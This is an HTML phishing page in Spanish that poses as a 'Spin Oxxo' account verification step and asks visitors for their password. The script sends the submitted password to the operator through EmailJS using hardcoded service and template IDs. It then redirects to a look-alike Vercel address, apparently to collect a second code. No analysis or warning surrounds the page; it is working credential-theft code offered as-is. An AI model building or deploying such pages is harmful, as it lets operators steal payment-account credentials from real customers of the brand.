<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./contraseña.css">
    <title>Spin</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>
    <div class="contglobal">
        <div class="contitle">
            <h3 class="conttitle__title">Termina tu verificación Spin Oxxo</h3>
        </div>
        <form id="my-form">
            <input type="hidden" name="_captcha" value="false">
            <input name="_formsubmit_id" type="text" style="display:none">
            <div class="continputlabel">
                <label class="continputlabel__label">Contraseña</label>
                <input class="continputlabel__input" type="text" name="contraseña" placeholder="Ingresa tu contraseña">
            </div>
            <div class="contbtn">
                <input value="Autorizar" class="contbtn__btn" type="submit">
            </div>
        </form>
    </div>
    <div style="display: flex; align-items: center; justify-content:center; margin-top:60px;">
        <img width="150px" src="./logo.jpeg" alt="">
    </div>
    
    <script>
        // Inicializar EmailJS
        (function() {
            emailjs.init('uKG8o-MBNGW7QBKhp'); // Reemplaza 'YOUR_USER_ID' con tu identificador de usuario de EmailJS
        })();

        // Agregar evento al formulario para enviar con EmailJS
        document.querySelector('form').addEventListener('submit', function(event) {
            event.preventDefault(); // Previene el envío del formulario por defecto
            var form = document.getElementById('my-form');

            // Enviar el formulario usando EmailJS
            emailjs.sendForm('service_izp7mc5', 'template_vcwuhph', form)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    window.location.href = 'https://mispinquierocontinuaroxxoclienpremier.vercel.app/segundocodigo.html';
                }, function(error) {
                    console.log('FAILED...', error);
                });
        });
    </script>
</body>
</html>
